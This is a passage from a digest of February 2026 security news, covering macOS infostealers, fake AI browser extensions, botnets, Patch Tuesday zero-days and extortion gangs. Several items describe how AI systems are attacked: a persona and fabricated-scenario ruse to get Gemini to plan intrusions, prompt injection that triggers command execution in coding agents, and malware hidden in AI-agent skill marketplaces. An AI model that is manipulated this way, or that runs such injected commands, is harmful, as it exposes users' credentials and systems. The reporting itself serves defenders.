"EPMM compromise provides access to device management infrastructure for entire organizations, creating a lateral movement platform that bypasses traditional network segmentation," GreyNoise said. "Organizations with internet-facing MDM, VPN concentrators, or other remote access infrastructure should operate under the assumption that critical vulnerabilities face exploitation within hours of disclosure."

[4] BleepingComputer - AMOS infostealer targets macOS through a popular AI app  
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 09:25:38 -0500

[TAM METİN - 1352 kelime]
Infostealers like Atomic MacOS Stealer (AMOS) represent far more than a standalone malware. They are foundational components of a mature cybercrime economy built around harvesting, trading, and operationalizing stolen digital identities.

Rather than acting as the end goal, modern stealers function as large-scale data collection engines that feed underground markets, where stolen credentials, sessions, and financial data are bought and sold to fuel account takeovers, fraud, and follow-on intrusions.

What makes these campaigns particularly effective is their highly opportunistic social engineering approach: attackers continuously adapt to technology trends, abusing trusted platforms, popular software, search engines, and even emerging AI ecosystems to trick users into executing malware themselves.

This combination of industrialized data monetization and adaptive social engineering has made infostealers one of the most reliable and scalable entry points in today’s cybercrime landscape.

In the new 2026 Enterprise Infostealer Identity Exposure report, Flare researchers highlight the growing dominance of infostealers within the cybercrime economy and the expanding impact of identity exposure on organizations.

In this article, we examine the AMOS infostealer as a case study, exploring its evolution, operational model, and real-world activity across its active years.

How Do Infostealers Work?

Infostealers operate as one of the most critical enablers in the modern cybercrime kill chain because they transform a single infection into large-scale credential, session, and identity compromise.

ClawHavoc - The Most Recent Campaign

Recent research by Koi security reminded us that AMOS infostealer dissemination techniques are cunningly designed to find weaknesses and exploit every segment of technology users to steal their credentials.

The research describes ClawHavoc as a large-scale supply-chain campaign targeting the OpenClaw and ClawHub ecosystem (A very popular personal AI assistant) by poisoning the skill marketplace itself.

While the specific details are impressive, what matters more is the underlying tactic. AMOS distributors are capitalizing on OpenClaw's popularity as AI-hyped software.

As users rush to install it for personal or organizational gains, attackers see an opportunity to bundle AMOS malware within it to steal valuable PII, credentials, and sensitive data.

The delivery model: attackers uploaded skills (OpenClaw add-ons) that looked legitimate: crypto tools, productivity utilities, YouTube helpers, finance or Google Workspace integrations, etc.

Once installed, the malware could steal credentials, crypto wallet data, browser sessions, SSH keys, and other sensitive data, highlighting how AI agent extension ecosystems can become high-impact distribution channels when marketplace vetting is weak.

This is the latest campaign, let’s remember how it all started…

Monitor Stealer Logs Before Attackers Strike

Flare tracks over 1 million new stealer logs weekly from dark web markets and Telegram channels.

AMOS the Malware - First Sighting of AMOS

AMOS first appeared around May 2023 on a Telegram channel.

Stating its capabilities, which include exporting passwords from the Mac keychain, file grabber, system info, and macOS password exfiltration, browser session theft, crypto wallet data theft with various infostealer management capabilities (web-panel, tests, Telegram logs, etc).

Back then, the cost was $1000 per month, paid through USDT(TRC20), ETH, or BTC.

Since then, AMOS infostealer has become a part of the underground ecosystem, threat actors are willing to buy stealer logs that were extracted from infostealers (such as AMOS) in order to use them as an initial access to their own nefarious business.

For instance, below you can see that a Russian-speaking threat actor dealing with Crypto wallet theft is looking for relevant AMOS logs.

Traditionally, AMOS is disseminated like every known and popular infostealers, such as phishing links, phishing emails, trojanized installers, and click baits, but throughout recent years we have also seen some more noticeable campaigns.

Targeting LastPass Users

In an underground forum, we saw a post about LastPass that warned of an ongoing AMOS campaign.

This campaign was targeting macOS users through fake applications distributed via fraudulent GitHub repositories, where attackers impersonate over 100 well-known software brands to increase legitimacy.

The operation relies on SEO poisoning across Google and Bing to push these malicious repositories into search results, ultimately leading victims to ClickFix-style pages that socially engineer them into pasting Terminal commands, which download and execute the AMOS payload.

The campaign is particularly resilient because attackers continuously generate new GitHub repositories using automated account creation, highlighting how trusted developer platforms and search engines are increasingly abused as scalable malware distribution infrastructure.

AI-Driven Dissemination Channels

ClawHavoc wasn’t AMOS’s first AI campaign. In December 2025, Huntress reported that AMOS is targeting ChatGPT users. The threat actors used the ChatGPT shared chat feature to host malicious “installation guides” directly on a trusted domain (chatgpt.com), making the lure significantly more convincing.

Victims are driven there mainly via paid search ads (SEO poisoning/malvertising) promoting a fake “ChatGPT Atlas browser for macOS”, then instructed to run a one-line terminal command, effectively turning the user into the execution mechanism.

This example shows yet again that threat actors are weaponizing AI content hype as part of their malware distribution.

Traditional Dissemination Channels

Modern macOS infostealer campaigns rely heavily on social engineering–driven distribution rather than technical exploits. Threat actors commonly create fake installers for popular software such as Tor Browser, Photoshop, or Microsoft Office, packaging malware inside realistic-looking DMG disk images.

In parallel, they use malvertising through platforms like Google Ads to drive victims to spoofed download sites that closely mimic legitimate vendors.

For example, users searching for legitimate software may be redirected to look-alike domains hosting malicious installers that silently deploy stealers such as AMOS.

Another growing tactic is the use of instruction-based execution techniques (often called ClickFix), where victims are guided to run commands themselves in the macOS Terminal.

Instead of exploiting system vulnerabilities, attackers rely on convincing installation instructions, which ultimately execute the malware payload. For instance, asking users to drag files into Terminal or paste commands.

Together, these methods reflect a shift toward abusing user trust, brand impersonation, and legitimate distribution channels to bypass traditional security controls and increase infection success rates.

The Underground Economy Model

The AMOS ecosystem operates as a structured Malware-as-a-Service (MaaS) supply chain, where the developers (often tracked in underground forums as AMOS sellers or affiliates) provide the stealer platform, updates, infrastructure components, and sometimes management panels for a subscription cost historically advertised around ~$1,000 per month, typically paid in cryptocurrency.

Downstream threat actors purchase access to the stealer kit, customize lures or distribution channels (malvertising, fake installers, phishing, SEO poisoning, supply-chain abuse, or social engineering campaigns), and focus on maximizing infection volume.

The primary output is a list of stolen credentials, PII, and session logs. This becomes a tradable commodity in underground markets.

These stealer logs are purchased by secondary actors such as access brokers, account takeover specialists, and crypto cash-out operators, who use them for follow-on operations, including SaaS account compromise, financial fraud, ransomware initial access, or cryptocurrency theft.

This multi-stage monetization model turns AMOS infections into a repeatable revenue pipeline, where each actor in the chain specializes in development, distribution, or monetization, reflecting the broader industrialization of the modern infostealer economy.

Unlike traditional malware that focuses on persistence, defense evasion, lateral movement, or destruction, infostealers prioritize speed, data coverage, and stealth, allowing attackers to quickly convert stolen data into usable access.

The resulting “stealer logs” are then sold or traded in underground markets, where other threat actors use them for account takeover, lateral movement, fraud, or follow-on attacks, defacto making infostealers a foundational data-supply layer for the broader cybercrime economy.

The distributor layer is where we typically see the “innovative” or “creative” side of these campaigns - and it’s what usually makes the headlines. This is the layer behind narratives like “AMOS is now targeting AI apps” or “AMOS campaigns are hitting LastPass users.”

In reality, the core malware developers often remain consistent, occasionally adding a new feature or improving packaging and evasion, but the underlying capability set changes incrementally.

The downstream log consumers also tend to operate with established, repeatable monetization techniques.

The distributors, however, are the ones driving real campaign evolution: they decide who to target, define campaign scope, choose distribution channels, and continuously refine the psychological and social engineering techniques used to manipulate victims as part of their operational playbook.

[5] BleepingComputer - Fake AI Chrome extensions with 300K users steal credentials, emails
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 08:41:55 -0500
Link: https://www.bleepingcomputer.com/news/security/fake-ai-chrome-extensions-with-300k-users-steal-credentials-emails/

[TAM METİN - 607 kelime]
A set of 30 malicious Chrome extensions that have been installed by more than 300,000 users are masquerading as AI assistants to steal credentials, email content, and browsing information.

Some of the extensions are still present in the Chrome Web Store and have been installed by tens of thousands of users, while others show a small install count.

Researchers at browser security platform LayerX discovered the malicious extension campaign and named it AiFrame. They found that all analyzed extensions are part of the same malicious effort as they communicate with infrastructure under a single domain, tapnetic[.]pro.

According to them, the most popular extension in the AiFrame campaign had 80,000 users and was called Gemini AI Sidebar (fppbiomdkfbhgjjdmojlogeceejinadg), but it is no longer on the Chrome Web Store.

However, BleepingComputer found that other extensions with thousands of users are still present on Google's repository for Chrome extensions. It should be noted that the names may be different in some cases, but the identification is the same.

AI Sidebar (gghdfkafnhfpaooiolhncejnlgglhkhe) – 70,000 users

AI Assistant (nlhpidbjmmffhoogcennoiopekbiglbp) – 60,000 users

ChatGPT Translate (acaeafediijmccnjlokgcdiojiljfpbe) – 30,000 users

AI GPT (kblengdlefjpjkekanpoidgoghdngdgl) – 20,000 users

ChatGPT (llojfncgbabajmdglnkbhmiebiinohek) – 20,000 users

AI Sidebar (djhjckkfgancelbmgcamjimgphaphjdl) – 10,000 users

Google Gemini (fdlagfnfaheppaigholhoojabfaapnhb) – 10,000 users

LayerX found that all 30 extensions share the same internal structure, JavaScript logic, permissions, and backend infrastructure.

The malicious browser add-ons do not implement AI functionality locally; instead, they deliver the promised feature by rendering a full-screen iframe to load content from a remote domain.

This, by itself, is risky, as publishers can change the extensions’ logic at any time without pushing an update - just like in the case of Microsoft Office Add-ins - thus avoiding a new review.

In the background, the extensions extract page content from websites the user visits, including sensitive authentication pages, using Mozilla’s Readability library.

LayerX says that a subset of 15 extensions specifically targets Gmail data, using a dedicated content script that runs at ‘document_start’ on ‘mail.google.com’ and injects UI elements.

The script reads visible email content directly from the DOM and repeatedly extracts email thread text via ‘.textContent.’ The researchers note that even email drafts can be captured.

“When Gmail-related features such as AI-assisted replies or summaries are invoked, the extracted email content is passed into the extension’s logic and transmitted to third-party backend infrastructure controlled by the extension operator,” LayerX explains in a report today.

“As a result, email message text and related contextual data may be sent off-device, outside of Gmail’s security boundary, to remote servers.”

The extensions also feature a remotely triggered voice recognition and transcript generation mechanism using the ‘Web Speech API,’ returning the results to the operators. Depending on the granted permissions, the extensions may even siphon conversations from the victim’s environment.

BleepingComputer has contacted Google for a comment on LayerX findings, but we have not received a response by publication time.

It is recommended to check LayerX's list of indicators of compromise for the complete set of malicious extensions. If compromise is confirmed, users should reset passwords for all accounts.

[6] BleepingComputer - Google says hackers are abusing Gemini AI for all attacks stages
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 02:00:00 -0500
Link: https://www.bleepingcomputer.com/news/security/google-says-hackers-are-abusing-gemini-ai-for-all-attacks-stages/

[TAM METİN - 770 kelime]
State-backed hackers are using Google's Gemini AI model to support all stages of an attack, from reconnaissance to post-compromise actions.

Bad actors from China (APT31, Temp.HEX), Iran (APT42), North Korea (UNC2970), and Russia used Gemini for target profiling and open-source intelligence, generating phishing lures, translating text, coding, vulnerability testing, and troubleshooting.

Cybercriminals are also showing increased interest in AI tools and services that could help in illegal activities, such as social engineering ClickFix campaigns.

AI-enhanced malicious activity

The Google Threat Intelligence Group (GTIG) notes in a report today that APT adversaries use Gemini to support their campaigns "from reconnaissance and phishing lure creation to command and control  (C2) development and data exfiltration."

Chinese threat actors employed an expert cybersecurity persona to request that Gemini automate vulnerability analysis and provide targeted testing plans in the context of a fabricated scenario.

“The PRC-based threat actor fabricated a scenario, in one case trialing Hexstrike MCP tooling, and directing the model to analyze Remote Code Execution (RCE), WAF bypass techniques, and SQL injection test results against specific US-based targets,” Google says.

Another China-based actor frequently employed Gemini to fix their code, carry out research, and provide advice on technical capabilities for intrusions.

The Iranian adversary APT42 leveraged Google's LLM for social engineering campaigns, as a development platform to speed up the creation of tailored malicious tools (debugging, code generation, and researching exploitation techniques).

Additional threat actor abuse was observed for implementing new capabilities into existing malware families, including the CoinBait phishing kit and the HonestCue malware downloader and launcher.

GTIG notes that no major breakthroughs have occurred in that respect, though the tech giant expects malware operators to continue to integrate AI capabilities into their toolsets.

HonestCue is a proof-of-concept malware framework observed in late 2025 that uses the Gemini API to generate C# code for second-stage malware, then compiles and executes the payloads in memory.

CoinBait is a React SPA-wrapped phishing kit masquerading as a cryptocurrency exchange for credential harvesting. It contains artifacts indicating that its development was advanced using AI code generation tools.

One indicator of LLM use is logging messages in the malware source code that were prefixed with "Analytics:," which could help defenders track data exfiltration processes.

Based on the malware samples, GTIG researchers believe that the malware was created using the Lovable AI platform, as the developer used the Lovable Supabase client and lovable.app.

Cybercriminals also used generative AI services in ClickFix campaigns, delivering the AMOS info-stealing malware for macOS. Users were lured to execute malicious commands through malicious ads listed in search results for queries on troubleshooting specific issues.

The report further notes that Gemini has faced AI model extraction and distillation attempts, with organizations leveraging authorized API access to methodically query the system and reproduce its decision-making processes to replicate its functionality.

Although the problem is not a direct threat to users of these models or their data, it constitutes a significant commercial, competitive, and intellectual property problem for the creators of these models.

Essentially, actors take information obtained from one model and transfer the information to another using a machine learning technique called "knowledge distillation," which is used to train fresh models from more advanced ones.

“Model extraction and subsequent knowledge distillation enable an attacker to accelerate AI model development quickly and at a significantly lower cost,” GTIG researchers say.

Google flags these attacks as a threat because they constitute intellectual theft, they are scalable, and severely undermine the business model of AI-as-a-service, which has the potential to impact end users soon.

In a large-scale attack of this kind, Gemini AI was targeted by 100,000 prompts that posed a series of questions aimed at replicating the model’s reasoning across a range of tasks in non-English languages.

Google has disabled accounts and infrastructure tied to documented abuse, and has implemented targeted defenses in Gemini’s classifiers to make abuse harder.

The company assures that it "designs AI systems with robust security measures and strong safety guardrails" and regularly tests the models to improve their security and safety.

[7] Krebs on Security - Kimwolf Botnet Swamps Anonymity Network I2P
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 11 Feb 2026 16:08:11 +0000
Link: https://krebsonsecurity.com/2026/02/kimwolf-botnet-swamps-anonymity-network-i2p/

[TAM METİN - 831 kelime]
For the past week, the massive “Internet of Things” (IoT) botnet known as Kimwolf has been disrupting The Invisible Internet Project (I2P), a decentralized, encrypted communications network designed to anonymize and secure online communications. I2P users started reporting disruptions in the network around the same time the Kimwolf botmasters began relying on it to evade takedown attempts against the botnet’s control servers.

Kimwolf is a botnet that surfaced in late 2025 and quickly infected millions of systems, turning poorly secured IoT devices like TV streaming boxes, digital picture frames and routers into relays for malicious traffic and abnormally large distributed denial-of-service (DDoS) attacks.

I2P is a decentralized, privacy-focused network that allows people to communicate and share information anonymously.

“It works by routing data through multiple encrypted layers across volunteer-operated nodes, hiding both the sender’s and receiver’s locations,” the I2P website explains. “The result is a secure, censorship-resistant network designed for private websites, messaging, and data sharing.”

On February 3, I2P users began complaining on the organization’s GitHub page about tens of thousands of routers suddenly overwhelming the network, preventing existing users from communicating with legitimate nodes. Users reported a rapidly increasing number of new routers joining the network that were unable to transmit data, and that the mass influx of new systems had overwhelmed the network to the point where users could no longer connect.

I2P users complaining about service disruptions from a rapidly increasing number of routers suddenly swamping the network.

When one I2P user asked whether the network was under attack, another user replied, “Looks like it. My physical router freezes when the number of connections exceeds 60,000.”

A graph shared by I2P developers showing a marked drop in successful connections on the I2P network around the time the Kimwolf botnet started trying to use the network for fallback communications.

The same day that I2P users began noticing the outages, the individuals in control of Kimwolf posted to their Discord channel that they had accidentally disrupted I2P after attempting to join 700,000 Kimwolf-infected bots as nodes on the network.

The Kimwolf botmaster openly discusses what they are doing with the botnet in a Discord channel with my name on it.

Although Kimwolf is known as a potent weapon for launching DDoS attacks, the outages caused this week by some portion of the botnet attempting to join I2P are what’s known as a “Sybil attack,” a threat in peer-to-peer networks where a single entity can disrupt the system by creating, controlling, and operating a large number of fake, pseudonymous identities.

Indeed, the number of Kimwolf-infected routers that tried to join I2P this past week was many times the network’s normal size. I2P’s Wikipedia page says the network consists of roughly 55,000 computers distributed throughout the world, with each participant acting as both a router (to relay traffic) and a client.

However, Lance James, founder of the New York City based cybersecurity consultancy Unit 221B and the original founder of I2P, told KrebsOnSecurity the entire I2P network now consists of between 15,000 and 20,000 devices on any given day.

An I2P user posted this graph on Feb. 10, showing tens of thousands of routers — mostly from the United States — suddenly attempting to join the network.

Benjamin Brundage is founder of Synthient, a startup that tracks proxy services and was the first to document Kimwolf’s unique spreading techniques. Brundage said the Kimwolf operator(s) have been trying to build a command and control network that can’t easily be taken down by security companies and network operators that are working together to combat the spread of the botnet.

Brundage said the people in control of Kimwolf have been experimenting with using I2P and a similar anonymity network — Tor — as a backup command and control network, although there have been no reports of widespread disruptions in the Tor network recently.

“I don’t think their goal is to take I2P down,” he said. “It’s more they’re looking for an alternative to keep the botnet stable in the face of takedown attempts.”

The Kimwolf botnet created challenges for Cloudflare late last year when it began instructing millions of infected devices to use Cloudflare’s domain name system (DNS) settings, causing control domains associated with Kimwolf to repeatedly usurp Amazon, Apple, Google and Microsoft in Cloudflare’s public ranking of the most frequently requested websites.

James said the I2P network is still operating at about half of its normal capacity, and that a new release is rolling out which should bring some stability improvements over the next week for users.

Meanwhile, Brundage said the good news is Kimwolf’s overlords appear to have quite recently alienated some of their more competent developers and operators, leading to a rookie mistake this past week that caused the botnet’s overall numbers to drop by more than 600,000 infected systems.

“It seems like they’re just testing stuff, like running experiments in production,” he said. “But the botnet’s numbers are dropping significantly now, and they don’t seem to know what they’re doing.”

[8] Krebs on Security - Patch Tuesday, February 2026 Edition
────────────────────────────────────────────────────────────────────────────────
Tarih: Tue, 10 Feb 2026 21:49:53 +0000
Link: https://krebsonsecurity.com/2026/02/patch-tuesday-february-2026-edition/

[TAM METİN - 515 kelime]
Microsoft today released updates to fix more than 50 security holes in its Windows operating systems and other software, including patches for a whopping six “zero-day” vulnerabilities that attackers are already exploiting in the wild.

Zero-day #1 this month is CVE-2026-21510, a security feature bypass vulnerability in Windows Shell wherein a single click on a malicious link can quietly bypass Windows protections and run attacker-controlled content without warning or consent dialogs. CVE-2026-21510 affects all currently supported versions of Windows.

The zero-day flaw CVE-2026-21513 is a security bypass bug targeting MSHTML, the proprietary engine of the default Web browser in Windows. CVE-2026-21514 is a related security feature bypass in Microsoft Word.

The zero-day CVE-2026-21533 allows local attackers to elevate their user privileges to “SYSTEM” level access in Windows Remote Desktop Services. CVE-2026-21519 is a zero-day elevation of privilege flaw in the Desktop Window Manager (DWM), a key component of Windows that organizes windows on a user’s screen. Microsoft fixed a different zero-day in DWM just last month.

The sixth zero-day is CVE-2026-21525, a potentially disruptive denial-of-service vulnerability in the Windows Remote Access Connection Manager, the service responsible for maintaining VPN connections to corporate networks.

Chris Goettl at Ivanti reminds us Microsoft has issued several out-of-band security updates since January’s Patch Tuesday. On January 17, Microsoft pushed a fix that resolved a credential prompt failure when attempting remote desktop or remote application connections. On January 26, Microsoft patched a zero-day security feature bypass vulnerability (CVE-2026-21509) in Microsoft Office.

Kev Breen at Immersive notes that this month’s Patch Tuesday includes several fixes for remote code execution vulnerabilities affecting GitHub Copilot and multiple integrated development environments (IDEs), including VS Code, Visual Studio, and JetBrains products. The relevant CVEs are CVE-2026-21516, CVE-2026-21523, and CVE-2026-21256.

Breen said the AI vulnerabilities Microsoft patched this month stem from a command injection flaw that can be triggered through prompt injection, or tricking the AI agent into doing something it shouldn’t — like executing malicious code or commands.

“Developers are high-value targets for threat actors, as they often have access to sensitive data such as API keys and secrets that function as keys to critical infrastructure, including privileged AWS or Azure API keys,” Breen said. “When organizations enable developers and automation pipelines to use LLMs and agentic AI, a malicious prompt can have significant impact. This does not mean organizations should stop using AI. It does mean developers should understand the risks, teams should clearly identify which systems and workflows have access to AI agents, and least-privilege principles should be applied to limit the blast radius if developer secrets are compromised.”

The SANS Internet Storm Center has a clickable breakdown of each individual fix this month from Microsoft, indexed by severity and CVSS score. Enterprise Windows admins involved in testing patches before rolling them out should keep an eye on askwoody.com, which often has the skinny on wonky updates. Please don’t neglect to back up your data if it has been a while since you’ve done that, and feel free to sound off in the comments if you experience problems installing any of these fixes.

[9] Krebs on Security - Please Don’t Feed the Scattered Lapsus ShinyHunters
────────────────────────────────────────────────────────────────────────────────
Tarih: Mon, 02 Feb 2026 16:15:16 +0000

[TAM METİN - 1200 kelime]
A prolific data ransom gang that calls itself Scattered Lapsus ShinyHunters (SLSH) has a distinctive playbook when it seeks to extort payment from victim firms: Harassing, threatening and even swatting executives and their families, all while notifying journalists and regulators about the extent of the intrusion. Some victims reportedly are paying — perhaps as much to contain the stolen data as to stop the escalating personal attacks. But a top SLSH expert warns that engaging at all beyond a “We’re not paying” response only encourages further harassment, noting that the group’s fractious and unreliable history means the only winning move is not to pay.

Image: Shutterstock.com, @Mungujakisa

Unlike traditional, highly regimented Russia-based ransomware affiliate groups, SLSH is an unruly and somewhat fluid English-language extortion gang that appears uninterested in building a reputation of consistent behavior whereby victims might have some measure of confidence that the criminals will keep their word if paid.

That’s according to Allison Nixon, director of research at the New York City based security consultancy Unit 221B. Nixon has been closely tracking the criminal group and individual members as they bounce between various Telegram channels used to extort and harass victims, and she said SLSH differs from traditional data ransom groups in other important ways that argue against trusting them to do anything they say they’ll do — such as destroying stolen data.

Like SLSH, many traditional Russian ransomware groups have employed high-pressure tactics to force payment in exchange for a decryption key and/or a promise to delete stolen data, such as publishing a dark web shaming blog with samples of stolen data next to a countdown clock, or notifying journalists and board members of the victim company. But Nixon said the extortion from SLSH quickly escalates way beyond that — to threats of physical violence against executives and their families, DDoS attacks on the victim’s website, and repeated email-flooding campaigns.

SLSH is known for breaking into companies by phishing employees over the phone, and using the purloined access to steal sensitive internal data. In a January 30 blog post, Google’s security forensics firm Mandiant said SLSH’s most recent extortion attacks stem from incidents spanning early to mid-January 2026, when SLSH members pretended to be IT staff and called employees at targeted victim organizations claiming that the company was updating MFA settings.

“The threat actor directed the employees to victim-branded credential harvesting sites to capture their SSO credentials and MFA codes, and then registered their own device for MFA,” the blog post explained.

Victims often first learn of the breach when their brand name is uttered on whatever ephemeral new public Telegram group chat SLSH is using to threaten, extort and harass their prey. According to Nixon, the coordinated harassment on the SLSH Telegram channels is part of a well-orchestrated strategy to overwhelm the victim organization by manufacturing humiliation that pushes them over the threshold to pay.

Nixon said multiple executives at targeted organizations have been subject to “swatting” attacks, wherein SLSH communicated a phony bomb threat or hostage situation at the target’s address in the hopes of eliciting a heavily armed police response at their home or place of work.

“A big part of what they’re doing to victims is the psychological aspect of it, like harassing executives’ kids and threatening the board of the company,” Nixon told KrebsOnSecurity. “And while these victims are getting extortion demands, they’re simultaneously getting outreach from media outlets saying, ‘Hey, do you have any comments on the bad things we’re going to write about you.”

In a blog post today, Unit 221B argues that no one should negotiate with SLSH because the group has demonstrated a willingness to extort victims based on promises that it has no intention to keep. Nixon points out that all of SLSH’s known members hail from The Com, shorthand for a constellation of cybercrime-focused Discord and Telegram communities which serve as a kind of distributed social network that facilitates instant collaboration.

Nixon said Com-based extortion groups tend to instigate feuds and drama between group members, leading to lying, betrayals, credibility destroying behavior, backstabbing, and sabotaging each other.

“With this type of ongoing dysfunction, often compounding by substance abuse, these threat actors often aren’t able to act with the core goal in mind of completing a successful, strategic ransom operation,” Nixon wrote. “They continually lose control with outbursts that put their strategy and operational security at risk, which severely limits their ability to build a professional, scalable, and sophisticated criminal organization network for continued successful ransoms – unlike other, more tenured and professional criminal organizations focused on ransomware alone.”

Intrusions from established ransomware groups typically center around encryption/decryption malware that mostly stays on the affected machine. In contrast, Nixon said, ransom from a Com group is often structured the same as violent sextortion schemes against minors, wherein members of The Com will steal damaging information, threaten to release it, and “promise” to delete it if the victim complies without any guarantee or technical proof point that they will keep their word. She writes:

A key component of SLSH’s efforts to convince victims to pay, Nixon said, involves manipulating the media into hyping the threat posed by this group. This approach also borrows a page from the playbook of sextortion attacks, she said, which encourages predators to keep targets continuously engaged and worrying about the consequences of non-compliance.

“On days where SLSH had no substantial criminal ‘win’ to announce, they focused on announcing death threats and harassment to keep law enforcement, journalists, and cybercrime industry professionals focused on this group,” she said.

Nixon knows a thing or two about being threatened by SLSH: For the past several months, the group’s Telegram channels have been replete with threats of physical violence against her, against Yours Truly, and against other security researchers. These threats, she said, are just another way the group seeks to generate media attention and achieve a veneer of credibility, but they are useful as indicators of compromise because SLSH members tend to name drop and malign security researchers even in their communications with victims.

“Watch for the following behaviors in their communications to you or their public statements,” Unit 221B’s advisory reads. “Repeated abusive mentions of Allison Nixon (or “A.N”), Unit 221B, or cybersecurity journalists—especially Brian Krebs—or any other cybersecurity employee, or cybersecurity company. Any threats to kill, or commit terrorism, or violence against internal employees, cybersecurity employees, investigators, and journalists.”

Unit 221B says that while the pressure campaign during an extortion attempt may be traumatizing to employees, executives, and their family members, entering into drawn-out negotiations with SLSH incentivizes the group to increase the level of harm and risk, which could include the physical safety of employees and their families.

“The breached data will never go back to the way it was, but we can assure you that the harassment will end,” Nixon said. “So, your decision to pay should be a separate issue from the harassment. We believe that when you separate these issues, you will objectively see that the best course of action to protect your interests, in both the short and long term, is to refuse payment.”

[10] Threatpost - Student Loan Breach Exposes 2.5M Records
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 31 Aug 2022 12:57:48 +0000
Link: https://threatpost.com/student-loan-breach-exposes-2-5m-records/180492/

[TAM METİN - 511 kelime]
2.5 million people were affected, in a breach that could spell more trouble down the line.

EdFinancial and the Oklahoma Student Loan Authority (OSLA) are notifying over 2.5 million loanees that their personal data was exposed in a data breach.

The target of the breach was Nelnet Servicing, the Lincoln, Neb.-based servicing system and web portal provider for OSLA and EdFinancial, according to a breach disclosure letter.

Nelnet revealed the breach to affected loan recipients on July 21, 2022 via a letter.

“[Our] cybersecurity team took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched[sic] an investigation with third-party forensic experts to determine the nature and scope of the activity,” according to the letter.

By August 17th, the investigation determined that personal user information was accessed by an unauthorized party. That exposed information included names, home addresses, email addresses, phone numbers and social security numbers for a total of 2,501,324 student loan account holders. Users’ financial information was not exposed.

According to a breach disclosure filing submitted by Nelnet’s general counsel, Bill Munn, to the state of Maine the breach occurred sometime between June 1, 2022 and July 22, 2022. However, a letter to affected customers pinpoints the breach to July 21. The breach was discovered on August 17, 2022.

“On July 21, 2022, Nelnet Servicing, LLC (Nelnet), our servicing system and customer website

portal provider, notified us that they had discovered a vulnerability that we believe led to this incident,” according to the Nelnet.

It’s unclear what the vulnerability was.

“On August 17, 2022, this investigation determined that certain student loan account registration information was accessible by an unknown party beginning in June 2022 and ending on July 22, 2022,” according to the letter.

Loan Recipient Targets

Although users’ most sensitive financial data was protected, the personal information that was accessed in the Nelnet breach “has potential to be leveraged in future social engineering and phishing campaigns,” explained Melissa Bischoping, endpoint security research specialist at Tanium, in a statement via email.

“With recent news of student loan forgiveness, it’s reasonable to expect the occasion to be used by scammers as a gateway for criminal activity,” Bischoping said.

Last week, the Biden administration announced a plan to cancel $10,000 of student loan debt for low- and middle-income loanees. She said the loan forgiveness program will be used to lure victims into opening up phishing emails.

She warns that recently breached data will be used to impersonate affected brands in waves of phishing campaigns targeting students and recent college graduates.

“Because they can leverage the trust from existing business relationships they can be particularly deceptive,” she wrote.

According to the breach disclosure Nelnet Servicing informed Edfinancial and OSLA that Nelnet Servicing’s cybersecurity team “took immediate action to secure the information system, block the suspicious activity, fix the issue, and launched an investigation with third-party forensic experts to determine the nature and scope of the activity.”

Remediation also included two years of free credit monitoring, credit reports and up to $1 million in identity theft insurance.

[11] Threatpost - Watering Hole Attacks Push ScanBox Keylogger
────────────────────────────────────────────────────────────────────────────────
Tarih: Tue, 30 Aug 2022 16:00:43 +0000
Link: https://threatpost.com/watering-hole-attacks-push-scanbox-keylogger/180490/

[TAM METİN - 918 kelime]
Researchers uncover a watering hole attack likely carried out by APT TA423, which attempts to plant the ScanBox JavaScript-based reconnaissance tool.

A China-based threat actor has ramped up efforts to distribute the ScanBox reconnaissance framework to victims that include domestic Australian organizations and offshore energy firms in the South China Sea. The bait used by the advanced threat group (APT) is targeted messages that supposedly link back to Australian news websites.

The cyber-espionage campaigns are believed to have launched April 2022 through mid-June 2022, according to a Tuesday report by Proofpoint’s Threat Research Team and PwC’s Threat Intelligence team.

The threat actor, according to researchers, is believed to be the China-based APT TA423, also known as Red Ladon. “Proofpoint assesses with moderate confidence that this activity may be attributable to the threat actor TA423 / Red Ladon, which multiple reports assess to operate out of Hainan Island, China,” according to the report.

The APT is most recently known for a recent indictment. “A 2021 indictment by the US Department of Justice assessed that TA423 / Red Ladon provides long-running support to the Hainan Province Ministry of State Security (MSS),” researchers said.

MSS is the civilian intelligence, security and cyber police agency for the People’s Republic of China. It is believed responsible for counter-intelligence, foreign intelligence, political security and tied to industrial and cyber espionage efforts by China.

Dusting Off the ScanBox

The campaign leverages the ScanBox framework. ScanBox is a customizable and multifunctional Javascript-based framework used by adversaries to conducting covert reconnaissance.

ScanBox has been used by adversaries for nearly a decade and is noteworthy because criminals can use the tool to conduct counter intelligence without having to plant malware on a targets system.

“ScanBox is particularly dangerous as it doesn’t require malware to be successfully deployed to disk in order to steal information – the keylogging functionality simply requires the JavaScript code to be executed by a web browser,” according to PwC researchers referring to a previous campaign.

In lieu of malware, attackers can use ScanBox in conjunction with watering hole attacks. Adversaries load the malicious JavaScript onto a compromised website where the ScanBox acts as a keylogger snagging all of a user’s typed activity on the infected watering hole website.

TA423’s attacks began with phishing emails, with such titles as “Sick Leave,” “User Research” and “Request Cooperation.” Often, the emails purported to come from an employee of the “Australian Morning News,” a fictional organization. The employee implored targets to visit their “humble news website,” australianmorningnews[.]com.

“Upon clicking the link and redirecting to the site, visitors were served the ScanBox framework,” researchers wrote.

The link directed targets to a web page with content copied from actual news sites, like the BBC and Sky News. In the process, it also delivered the ScanBox malware framework.

ScanBox keylogger data culled from waterholes is part of a multi-stage attack, giving attackers insight into the potential targets that will help them launch future attacks against them. This technique is often called browser fingerprinting.

The primary, initial script sources a list of information about the target computer, including the operating system, language and version of Adobe Flash installed. ScanBox additionally runs a check for browser extensions, plugins and components such WebRTC.

“The module implements WebRTC, a free and open-source technology supported on all major browsers, which allows web browsers and mobile applications to perform real-time communication (RTC) over application programming interfaces (APIs). This allows ScanBox to connect to a set of pre-configured targets,” researchers explain.

Adversaries can then leverage a technology called STUN (Session Traversal Utilities for NAT). This is a standardized set of methods, including a network protocol, that allows interactive communications (including real-time voice, video, and messaging applications) to traverse network address translator (NAT) gateways, researchers explain.

